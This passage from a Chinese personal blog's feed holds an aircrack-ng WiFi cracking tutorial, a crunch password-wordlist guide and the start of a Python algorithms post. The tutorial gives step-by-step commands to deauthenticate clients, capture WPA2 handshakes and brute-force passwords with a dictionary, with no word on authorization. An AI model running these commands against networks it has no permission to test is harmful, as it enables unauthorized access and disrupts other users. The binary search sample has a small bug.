    <content type="html"><![CDATA[<h1 id="aircrack-ng-wifi-渗透"><a href="#aircrack-ng-wifi-渗透" class="headerlink" title="aircrack-ng wifi 渗透"></a>aircrack-ng wifi 渗透</h1><h2 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h2><ol><li><p>现在的路由器基本都是WPA2的加密方式</p></li><li><p>Aircrack-ng是一个包含了多款工具的套装：</p><table><thead><tr><th align="left"><strong>组件名称</strong></th><th><strong>描  述</strong></th></tr></thead><tbody><tr><td align="left"><strong>aircrack-ng</strong></td><td>主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解</td></tr><tr><td align="left"><strong>airmon-ng</strong></td><td>用于改变无线网卡工作模式，以便其他工具的顺利使用</td></tr><tr><td align="left"><strong>airodump-ng</strong></td><td>用于捕获802.11数据报文，以便于aircrack-ng破解</td></tr><tr><td align="left"><strong>aireplay-ng</strong></td><td>在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量</td></tr><tr><td align="left"><strong>airserv-ng</strong></td><td>可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备</td></tr><tr><td align="left"><strong>airolib-ng</strong></td><td>进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件</td></tr><tr><td align="left"><strong>airdecap-ng</strong></td><td>用于解开处于加密状态的数据包</td></tr><tr><td align="left"><strong>tools</strong></td><td>其他用于辅助的工具，如airdriver-ng、packetforge-ng等</td></tr></tbody></table></li><li><p>aireplay-ng当前支持的攻击种类如下：</p><ul><li>Attack 0：解除认证攻击</li><li>Attack 1：伪造认证攻击</li><li>Attack 2：交互式注入攻击</li><li>Attack 3：ARP请求包重放攻击</li><li>Attack 4：chopchop Korek攻击</li><li>Attack 5：碎片交错攻击</li><li>Attack 6：Cafe-latte 攻击</li><li>Attack 7：面向客户的碎片攻击</li><li>Attack 8：WPA迁移模式</li><li>Attack 9：数据包注入测试</li></ul></li></ol><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><h3 id="查看网卡"><a href="#查看网卡" class="headerlink" title="查看网卡"></a>查看网卡</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><ul><li>可以看到里面有个wlan0，如果没有的话就把无线网卡拔了再插一下。直到找到那个wlan0为止。</li><li>一定要保证它现在没有连接到任何wifi。上面那个wlan0里面没有ip地址什么的就说明现在不在连接中。</li></ul><h3 id="杀进程"><a href="#杀进程" class="headerlink" title="杀进程"></a>杀进程</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng<span class="built_in"> check </span>kill</span><br></pre></td></tr></table></figure><h3 id="载入无线网卡驱动，激活无线网卡至monitor即监听模式"><a href="#载入无线网卡驱动，激活无线网卡至monitor即监听模式" class="headerlink" title="载入无线网卡驱动，激活无线网卡至monitor即监听模式"></a>载入无线网卡驱动，激活无线网卡至monitor即监听模式</h3><p>就下面一句就可以了</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sudo ifconfig wlan0 up</span></span><br><span class="line">airmon-ng <span class="literal">start</span> wlan0</span><br></pre></td></tr></table></figure><ul><li><p>可以看到下面写了monitor mode enable on <strong>wlan0mon</strong></p><p>重点!这句话的意思是，在监听模式下，无线网卡的名称已经变为了wlan0mon。</p></li></ul><h3 id="重启网卡"><a href="#重启网卡" class="headerlink" title="重启网卡"></a>重启网卡</h3><p><em>感觉木啥用,随便搞不搞都行.</em></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig wlan0mon down</span><br><span class="line">sudo iwconfig wlan0mon mode monitor</span><br><span class="line">sudo ifconfig wlan0mon up</span><br></pre></td></tr></table></figure><h2 id="探索阶段"><a href="#探索阶段" class="headerlink" title="探索阶段"></a>探索阶段</h2><p>查看周围wifi的各种信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><ul><li><strong>bssid</strong>:mac地址</li><li>essid:wifi名称</li><li><strong>ch</strong>:channel信道</li><li>enc:加密方式</li><li>下半部分的表罗列出连接到我连到的wifi内的设备的mac地址</li></ul><h2 id="抓包阶段"><a href="#抓包阶段" class="headerlink" title="抓包阶段"></a>抓包阶段</h2><p>我们已经看到了要攻击的路由器的mac地址和其中的客户端的mac地址，还有工作频道。执行：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon <span class="comment">--bssid 路由器的mac地址 -c 信道 -w wpa</span></span><br></pre></td></tr></table></figure><ul><li>–bssid 是路由器的mac地址</li><li>-w 是写入到文件wpa中</li><li>-c 11 是频道11</li></ul><h2 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h2><p>这里为了获得破解所需的WPA2握手验证的整个完整数据包，我们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，我们也就有机会捕获到包含WPA2握手验证的完整数据包了。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng <span class="number">-0</span> <span class="number">1</span> –a 路由mac地址 -c 目标mac地址 wlan0mon</span><br></pre></td></tr></table></figure><ul><li>-0 采用deauth攻击模式，后面跟上攻击次数</li><li>-a 后跟路由器的mac地址</li><li>-c 后跟客户端的mac地址</li></ul><p>注意看抓包页面右上角是否出现<strong>WPA handshake [路由地址]</strong></p><p>这步很重要,要反复直到刷出</p><h2 id="破解阶段"><a href="#破解阶段" class="headerlink" title="破解阶段"></a>破解阶段</h2><p><strong>用kali自带字典爆破</strong></p><ol><li>看看</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ls</span></span><br></pre></td></tr></table></figure><ol start="2"><li>使用Kali Linux中默认存在的字典，目录为/usr/share/wordlists/rockyou.txt.zip，其中需要使用命令来解压：</li></ol><p>这步只需要做一次，下次就不用做了，因为已经解压好了</p><p>如果出现错误，按路径找到文件手动解压</p><p><del>这操蛋的人生</del></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.zip</span><br></pre></td></tr></table></figure><p>这里顺便记录一下Kali中几个常用的字典文件的位置：</p><p>/usr/share/john/password.lst</p><p>/usr/share/wfuzz/wordlist</p><p>/usr/share/ wordlists</p><ol start="3"><li>破解</li></ol><p>至于这里为什么是wpa-04，因为我<del>傻傻的</del>做了四次抓包。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt wpa-<span class="number">04</span>.cap</span><br></pre></td></tr></table></figure><p><strong>常规</strong></p><p>使用aircrack-ng进行破解</p><ol><li>先看看我们抓到的握手包是什么名字</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ls</span></span><br></pre></td></tr></table></figure><p>可以看到一个叫做longas-01.ivs的，这个就是我们要破解的文件。<br>这时候我们需要准备一个字典文件用来破解这个longas-01.ivs。</p><ol start="2"><li>可以使用crunch这个软件生成字典。</li><li>破解</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">aircrack-ng</span> <span class="selector-tag">-w</span> <span class="selector-tag">dict1</span><span class="selector-class">.txt</span> <span class="selector-tag">longas-01</span><span class="selector-class">.ivs</span></span><br></pre></td></tr></table></figure><p>此时的破解速度跟使用的机器性能和字典大小有关。为了节省时间可以把密码直接加入到字典中了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;aircrack-ng-wifi-渗透&quot;&gt;&lt;a href=&quot;#aircrack-ng-wifi-渗透&quot; class=&quot;headerlink&quot; title=&quot;aircrack-ng wifi 渗透&quot;&gt;&lt;/a&gt;aircrack-ng wifi 渗透&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="虚拟机" scheme="https://mercer5.github.io/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>crunch 使用指南</title>
    <link href="https://mercer5.github.io/2019/12/10/crunch-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>https://mercer5.github.io/2019/12/10/crunch-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</id>
    <published>2019-12-10T11:35:51.000Z</published>
    <updated>2020-08-24T15:30:09.746Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crunch-使用指南"><a href="#crunch-使用指南" class="headerlink" title="crunch 使用指南"></a>crunch 使用指南</h1><h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><p>min  设定最小字符串长度<br>max  设定最大字符串长度</p><p>options<br>-b   指定文件输出的大小，避免字典文件过大<br>-c   指定文件输出的行数，即包含密码的个数<br>-d   限制相同元素出现的次数<br>-e   定义停止字符，即到该字符串就停止生成<br>-f   调用库文件（/etc/share/crunch/charset.lst）<br>-i   改变输出格式，即aaa,aab -&gt; aaa,baa<br>-I   通常与-t联合使用，表明该字符为实义字符<br>-m   通常与-p搭配<br>-o   将密码保存到指定文件<br>-p   指定元素以组合的方式进行<br>-q   读取密码文件，即读取pass.txt<br>-r   定义重某一字符串重新开始<br>-s   指定一个开始的字符，即从自己定义的密码xxxx开始<br>-t   指定密码输出的格式<br>-u   禁止打印百分比（必须为最后一个选项）<br>-z   压缩生成的字典文件，支持gzip,bzip2,lzma,7z  </p><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>%   代表数字<br>^   代表特殊符号<br>@   代表小写字母<br>,   代表大写字符 </p><h3 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h3><ol><li>生成一个字典库 :5位的6个小写字母的随机排列组合,可以生成67 MB这么大的字典文件</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">5</span> <span class="number">5</span> -b <span class="number">20</span>mib -o START</span><br></pre></td></tr></table></figure><ol start="2"><li><p>生成一个字典文件，用自己指定的字符:默认为26个小写字母为元素的所有组合</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">1</span> <span class="number">3</span> abc</span><br></pre></td></tr></table></figure></li><li><p>通过-l参数来使@,%^等特殊字符输出</p></li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">7</span> <span class="number">7</span> -t <span class="symbol">p@</span>ss,%^ -l <span class="symbol">a@</span>aaaaa</span><br></pre></td></tr></table></figure><ol start="4"><li>-o参数也可使用&gt;&gt;来简化</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">4</span> <span class="number">4</span> -d <span class="symbol">2@</span> -t @@@% &gt;&gt; test.txt</span><br></pre></td></tr></table></figure><ol start="5"><li>生成10位密码，并指定格式</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">10</span> <span class="number">10</span> -t @@@^%%%%^^ -d <span class="symbol">2@</span> -d <span class="number">3</span>% -b <span class="number">20</span>mb -o START</span><br></pre></td></tr></table></figure><p>格式为三个小写字母+一个符号+四个数字+两个符号，限制每个密码至少2种字母和至少3种数字，文件大小为20MB。“-d 2@”表示字母重复最多2次。</p><p>-d 数字符号，限制出现相同元素的个数(至少出现元素个数)，“-d 2@”限制小写字母输出像aab和aac，aaa不会产生，因为这是连续3个字母，格式是数字+符号，数字是连续字母出现的次数，符号是限制字符串的字符，例如@,%^(“@”代表小写字母，“,”代表大写字符，“%”代表数字，“^”代表特殊字符)</p><p>-t @,%^，指定模式，@,%^分别代表意义如下：</p><p>@ 插入小写字母<br>, 插入大写字母<br>% 插入数字<br>^ 插入特殊符号</p><h2 id="密码库"><a href="#密码库" class="headerlink" title="密码库"></a>密码库</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/crunch/</span>charset.lst</span><br></pre></td></tr></table></figure><p>numeric   表示0123456789<br>Lalpha   表示26位小写字母<br>Ualpha   表示26位大写字母</p><h3 id="使用案例-1"><a href="#使用案例-1" class="headerlink" title="使用案例"></a>使用案例</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">1</span> <span class="number">1</span> -f /usr/<span class="keyword">share</span>/crunch/charset.lst  mixalpha-<span class="type">numeric</span>-<span class="keyword">all</span>-space -o  <span class="keyword">START</span>  -c  <span class="number">60</span></span><br></pre></td></tr></table></figure><p> -c 数字 指定写入输出文件的行数，也即包含密码的个数，例如使用字符规则mixalpha-numeric-all-space，生成最小和最大字符串为1的且每一个文件保存60个字符串的密码字典</p><p> -f /path/to/charset.lst charset-name，从charset.lst指定字符集，也即调用密码库文件，比如kali中的charset.lst 在/usr/share/crunch/charset.lst，则参数为“-f /usr/share/crunch/charset.lst”</p><h2 id="比较有用的命令"><a href="#比较有用的命令" class="headerlink" title="比较有用的命令"></a>比较有用的命令</h2><ol><li>生成pass01-pass99所有数字组合</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">6</span> <span class="number">6</span> -t pass%%  &gt;&gt;newpwd.txt</span><br></pre></td></tr></table></figure><ol start="2"><li>生成六位小写字母密码，其中前四位为pass</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">6</span> <span class="number">6</span> -t <span class="symbol">pass@</span>@  &gt;&gt;newpwd.txt</span><br></pre></td></tr></table></figure><ol start="3"><li>生成六位密码，其中前四位为pass，后二位为大写</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">6</span> <span class="number">6</span> -t pass,,  &gt;&gt;newpwd.txt</span><br></pre></td></tr></table></figure><ol start="4"><li>生成六位密码，其中前四位为pass，后二位为特殊字符</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">6</span> <span class="number">6</span> -t pass^^  &gt;&gt;newpwd.txt</span><br></pre></td></tr></table></figure><ol start="5"><li>制作8位数字字典</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">8</span> <span class="number">8</span> charset.lst numeric -o num8.dic</span><br></pre></td></tr></table></figure><ol start="6"><li>制作6位数字字典</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">6</span> <span class="number">6</span>  <span class="number">0123456789</span> –o num6.dic</span><br></pre></td></tr></table></figure><ol start="7"><li>制作139开头的手机密码字典</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crunch <span class="number">11</span> <span class="number">11</span>  +<span class="number">0123456789</span> -t <span class="number">139</span>%%%%%%%% -b <span class="number">20</span>mib -o START</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;crunch-使用指南&quot;&gt;&lt;a href=&quot;#crunch-使用指南&quot; class=&quot;headerlink&quot; title=&quot;crunch 使用指南&quot;&gt;&lt;/a&gt;crunch 使用指南&lt;/h1&gt;&lt;h2 id=&quot;参数详解&quot;&gt;&lt;a href=&quot;#参数详解&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="虚拟机" scheme="https://mercer5.github.io/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>python算法集合</title>
    <link href="https://mercer5.github.io/2019/12/10/python-%E7%AE%97%E6%B3%95%E5%90%88%E9%9B%86/"/>
    <id>https://mercer5.github.io/2019/12/10/python-%E7%AE%97%E6%B3%95%E5%90%88%E9%9B%86/</id>
    <published>2019-12-10T11:35:51.000Z</published>
    <updated>2020-08-24T15:30:09.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python算法集合"><a href="#python算法集合" class="headerlink" title="python算法集合"></a>python算法集合</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>两种操作：压入/插入、弹出/删除并读取</p><p>特征：后进先出</p><p>！！调用另一个函数时，当前函数暂停并处于未完成状态</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>两种操作：入队、出队</p><p>特征：先进先出</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>python中的list</p><p>所有数据在内存中紧靠在一起，必须储存在一起，要是空间不够，要重新分配内存</p><p>可以直接读取某个元素</p><p>性能：读取速度快</p><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>元素可以储存在任何地方</p><p>每个元素都储存了下个元素的地址，只要有足够的内存空间，就能为链表分配内存</p><p>必须从第一个元素访问起，从中获取下一个的地址</p><p>性能：插入和删除速度快</p><h3 id="散列表-hash-table"><a href="#散列表-hash-table" class="headerlink" title="散列表/hash table"></a>散列表/hash table</h3><p>python中的dict</p><p>内部机制：实现、冲突、散列函数</p><p>数组、链表被直接映射到内存；散列表使用散列函数来确定元素的储存位置</p><p>作用：1.  防止重复<code>dict.get()</code> 2.  缓存/记住数据 3. 仿真映射关系</p><p>冲突：两个key被映射到同个位置</p><p>性能：读取、插入、删除都很快</p><h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(list,item)</span>:</span></span><br><span class="line">    low=<span class="number">0</span></span><br><span class="line">    high=len(list1)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:   </span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        guess=list1[mid]</span><br><span class="line">        <span class="keyword">if</span> guess==item:</span><br><span class="line">            print(<span class="string">"congratulations!the item="</span>,mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> guess&gt;item:</span><br><span class="line">            print(guess)</span><br><span class="line">            high=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            print(guess)</span><br><span class="line">            </span><br><span class="line">list1=list(range(<span class="number">100</span>))</span><br><span class="line">binary_search(list1,<span class="number">47</span>)</span><br></pre></td></tr></table></figure><h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><p>min</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findsmall</span><span class="params">(arr)</span>:</span></span><br><span class="line">    smallest=arr[<span class="number">0</span>]<span class="comment">#储存最小的值</span></span><br><span class="line">    smallest_index=<span class="number">0</span><span class="comment">#储存最小的值的索引</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        <span class="keyword">if</span> arr[i]&lt;smallest:</span><br><span class="line">            smallest=arr[i]</span><br><span class="line">            smallest_index=i</span><br><span class="line">    <span class="keyword">return</span> smallest_index<span class="comment">#返回最小值索引</span></span><br><span class="line"><span class="comment">#测试</span></span><br><span class="line"><span class="comment">#x=[43,5,57,31,4,35,45,45,6,3,42,1]    </span></span><br><span class="line"><span class="comment">#print(findsmall(x))</span></span><br></pre></td></tr></table></figure><p>排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selection</span><span class="params">(arr)</span>:</span></span><br><span class="line">    new_arr=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">        smallest_index=findsmall(arr)</span><br><span class="line">        new_arr.append(arr[smallest_index])</span><br><span class="line">        arr.pop(smallest_index)</span><br><span class="line">    <span class="keyword">return</span> new_arr</span><br><span class="line"><span class="comment">#x=[5,3,6,2,10]</span></span><br><span class="line"><span class="comment">#print(selection(x))</span></span><br></pre></td></tr></table></figure><h2 id="递归算法"><a href="#递归算法" class="headerlink" title="递归算法"></a>递归算法</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol><li>base case(基线条件)：函数不再调用自己</li><li>recursive case(递归条件)：函数调用自己</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#x!</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x*fact(x<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#print(fact(3))</span></span><br></pre></td></tr></table></figure><h3 id="D-amp-C"><a href="#D-amp-C" class="headerlink" title="D&amp;C"></a>D&amp;C</h3><p>即divide and conquer,分而治之，一种思想方法</p><p>工作原理：</p><ol><li>找出简单的基线条件</li><li>确定如何缩小问题规模，使其符合基线条件</li></ol><h4 id="eg1-sum-list"><a href="#eg1-sum-list" class="headerlink" title="eg1:sum(list)"></a>eg1:sum(list)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#遍历</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum1</span><span class="params">(arr)</span>:</span></span><br><span class="line">    total=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">        total+=i</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"><span class="comment">#print(sum([1,2,3,4]))</span></span><br></pre></td></tr></table></figure><p>思考：</p><ol><li>最简单的数组？<ul><li>空列表：sum=0</li><li>一个元素a：sum=a</li></ul></li><li>每次递归调用，都必须离空数组更进一步。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#递归</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum2</span><span class="params">(list)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> list==[]:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> list[<span class="number">0</span>]+sum2(list[<span class="number">1</span>:])</span><br><span class="line"><span class="comment">#print(sum2([1,2,3,4]))</span></span><br></pre></td></tr></table></figure><h4 id="sg2-quicksort"><a href="#sg2-quicksort" class="headerlink" title="sg2:quicksort"></a>sg2:quicksort</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quicksort</span><span class="params">(array)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(array)&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> array<span class="comment">#基线条件：为空或者只包含一个元素的数组是有序的</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pivot=array[<span class="number">0</span>]<span class="comment">#基准值</span></span><br><span class="line">        less=[i <span class="keyword">for</span> i <span class="keyword">in</span> array[<span class="number">1</span>:] <span class="keyword">if</span> i&lt;=pivot]<span class="comment">#由小于基准值的数构成的子数列</span></span><br><span class="line">        more=[i <span class="keyword">for</span> i <span class="keyword">in</span> array[<span class="number">1</span>:] <span class="keyword">if</span> i&gt;pivot]<span class="comment">#由大于基准值的数构成的子数列</span></span><br><span class="line">        <span class="keyword">return</span> quicksort(less)+[pivot]+quicksort(more)</span><br><span class="line"><span class="comment">#print(quicksort([2,5,7,123,87,4]))</span></span><br></pre></td></tr></table></figure><h2 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h2><p>适用于非加权图</p><p>找出两样东西之间的最短距离</p><p>图：1.仿真一组连线，由节点和边组成  2.与节点直接相邻的节点被称为邻居</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#找出seller</span></span><br><span class="line"><span class="comment">#建立关系图</span></span><br><span class="line">graph=&#123;&#125;</span><br><span class="line">graph[<span class="string">"you"</span>]=[<span class="string">"alice"</span>,<span class="string">"bob"</span>,<span class="string">"claire"</span>]</span><br><span class="line">graph[<span class="string">"bob"</span>]=[<span class="string">"anuj"</span>,<span class="string">"peggy"</span>]</span><br><span class="line">graph[<span class="string">"alice"</span>]=[<span class="string">"peggy"</span>]</span><br><span class="line">graph[<span class="string">"claire"</span>]=[<span class="string">"thom"</span>,<span class="string">"jonny"</span>]</span><br><span class="line">graph[<span class="string">"anuj"</span>]=[]</span><br><span class="line">graph[<span class="string">"peggy"</span>]=[]</span><br><span class="line">graph[<span class="string">"thom"</span>]=[]</span><br><span class="line">graph[<span class="string">"jonny"</span>]=[]</span><br><span class="line"><span class="comment">#建立双端队列</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="comment">#检验是否为seller</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person_is_seller</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> name[<span class="number">-1</span>]==<span class="string">"m"</span></span><br><span class="line"><span class="comment">#搜索</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(name)</span>:</span></span><br><span class="line">    search_queue=deque()<span class="comment">#建立队列</span></span><br><span class="line">    search_queue+=graph[name]<span class="comment"># 